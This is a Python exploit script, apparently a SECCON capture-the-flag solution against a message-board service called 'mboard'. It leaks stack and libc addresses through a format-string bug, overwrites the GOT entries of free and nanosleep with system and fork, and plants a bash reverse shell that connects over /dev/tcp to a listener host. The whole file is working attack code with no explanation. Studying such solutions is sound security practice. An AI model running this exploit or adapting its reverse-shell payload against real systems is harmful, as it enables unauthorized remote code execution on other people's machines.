#!/usr/bin/env python
from sc_pwn import *

str_pname   = './mboard'

env = Environment('local', 'remote')
env.set_item('mode',    local   = 'LOCAL', \
                        remote  = 'SOCKET')
env.set_item('target',  local   = {'program':'./mvees_sandbox --replicas=1 --level=2 --out-limit=8192 --deny=11 %s' % str_pname}, \
                        remote  = {'host':'mboard.pwn.seccon.jp','port':8273})
env.set_item('libc',    local   = lib_path(str_pname, 'libc.so.6'), \
                        remote  = '../libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
env.set_item('lhp',     local   = {'host':'localhost','port':1234}, \
                        remote  = {'host':'www.shift-crops.net','port':4296})
env.select()

libc = ELF(env.libc)
binf = ELF(str_pname)

offset_libc_dprintf_ret = 0x2b
offset_service_ret      = 0x144

offset_stack_ebp        = 0x34
offset_stack_oldebp     = 0x64

#==========
def attack(cmn):
    mb = MBoard(cmn)

    mb.register('hoge', 'a'*0x10)
    mb.remove(0)
    mb.remove(0)

    mb.register('hoge', 'A'*0x20)
    mb.register('fuga', 'B'*0x10+'\x08', False)
    mb.remove(1)

    #==========

    mb.modify(0, '%13$x %25$x ')
    addrs = mb.list().split(' ')[:2]
    addr_stack          = int(addrs[0], 16) - offset_stack_oldebp
    addr_ebp_main       = int(addrs[1], 16)

    addr_stack_gotplt   = addr_ebp_main - 0x34
    if (addr_ebp_main^addr_stack_gotplt)>>8:
        addr_stack_gotplt   = addr_ebp_main + 0x24
    offset_stack_gotplt = addr_stack_gotplt - addr_stack
    info('addr_stack            = 0x%08x' % addr_stack)
    info('offset_stack_gotplt   = 0x%x' % offset_stack_gotplt)
    
    mb.modify(0, '%18$x %14$x ')
    addrs = mb.list().split(' ')[:2]
    addr_libc_dprintf   = int(addrs[0], 16) - offset_libc_dprintf_ret
    addr_bin_service    = int(addrs[1], 16) - offset_service_ret

    binf.set_location('service', addr_bin_service)
    addr_got_nanosleep  = binf.got('nanosleep')
    addr_got_free       = binf.got('free')
    
    libc.set_location('dprintf', addr_libc_dprintf)
    addr_libc_fork      = libc.function('fork')
    addr_libc_system    = libc.function('system')

    #==========
    
    mb.modify(0, FSB(size=1).write(13, addr_stack_gotplt&0xff))
    mb.list()

    for i in range(4):
        mb.modify(0, FSB(size=1).write(25, (addr_got_free+i)&0xff))
        if not mb.list():
            return False
        
        mb.modify(0, FSB(size=1).write(offset_stack_gotplt/4, (addr_libc_system>>(8*i))&0xff))
        if not mb.list():
            return False

    mb.modify(0, FSB(size=1).write(25, addr_got_nanosleep&0xff))
    mb.list()
    mb.modify(0, FSB(size=1).write(offset_stack_gotplt/4, addr_libc_fork&0xff))

    if not mb.register('', '/bin/bash -c "bash -i >& /dev/tcp/%s/%d 0>&1"' % tuple(env.lhp.values())):
        return False

    mb.list()
    mb.remove(1)

    return 'nanosleep' in cmn.read_until()

class MBoard:
    def __init__(self, cmn):
        self.read_until = cmn.read_until
        self.send       = cmn.send
        self.sendln     = cmn.sendln

    def list(self):
        self.read_until('menu > ')
        self.sendln('1')
        self.read_until('Message Board Entry\n')
        ret = self.read_until()
        return ret if 'entries exist' in ret else None

    def register(self, name, msg, lf=True):
        self.read_until('menu > ')
        self.sendln('2')
        self.read_until('name >> ')
        self.sendln(name)
        self.read_until('len  >> ')
        self.sendln(str(len(msg)+1))
        if '[MVEEs]' in self.read_until(['msg  >> ', '[MVEEs]']):
            return False
        if lf:
            self.sendln(msg)
        else:
            self.send(msg)
        return True

    def remove(self, msg_id):
        self.read_until('menu > ')
        self.sendln('3')
        self.read_until('id   >> ')
        self.sendln(str(msg_id))

    def modify(self, msg_id, msg, lf=True):
        self.read_until('menu > ')
        self.sendln('4')
        self.read_until('id   >> ')
        self.sendln(str(msg_id))
        self.read_until('len  >> ')
        self.sendln(str(len(msg)+1))
        self.read_until('msg  >> ')
        if lf:
            self.sendln(msg)
        else:
            self.send(msg)

#==========

if __name__=='__main__':
    while True:
        cmn = Communicate(env.target, env.mode, disp=False)
        if attack(cmn):
            break
        
        del(cmn)
    info('Got a shell -> %s:%d' % tuple(env.lhp.values()))
    
#==========
